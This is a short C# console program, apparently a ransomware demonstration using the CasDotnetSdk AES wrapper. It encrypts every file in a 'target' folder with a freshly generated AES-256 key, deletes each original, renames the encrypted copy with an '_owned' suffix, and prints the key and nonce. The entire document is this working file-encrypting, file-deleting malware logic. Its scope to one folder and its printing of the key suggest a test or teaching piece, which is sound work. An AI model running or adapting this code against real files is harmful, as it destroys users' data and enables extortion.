// See https://aka.ms/new-console-template for more information\
using CasDotnetSdk.Symmetric;

string currentDir = Directory.GetCurrentDirectory();
string targetDir = currentDir + "\\" + "target";
string[] currentFiles = Directory.GetFiles(targetDir);
AESWrapper aesWrapper = new AESWrapper();
string aesKey = aesWrapper.Aes256Key();
string aesNonce = aesWrapper.GenerateAESNonce();
for (int i = 0; i < currentFiles.Length; i++)
{
    string currentFile = currentFiles[i];
    string[] fileName = Path.GetFileName(currentFile).Split(".");
    string newFileName = fileName[0] + "_owned." + fileName[1];
    byte[] fileBytes = File.ReadAllBytes(currentFile);
    byte[] encrypted = aesWrapper.Aes256EncryptBytes(aesNonce, aesKey, fileBytes);
    File.Delete(currentFile);
    File.WriteAllBytes(targetDir + "\\" + newFileName, encrypted);
}

Console.WriteLine("AES Key is: " + aesKey);
Console.WriteLine("AES Nonce is: " + aesNonce);

while (Console.ReadLine() != "q") 
{ 
};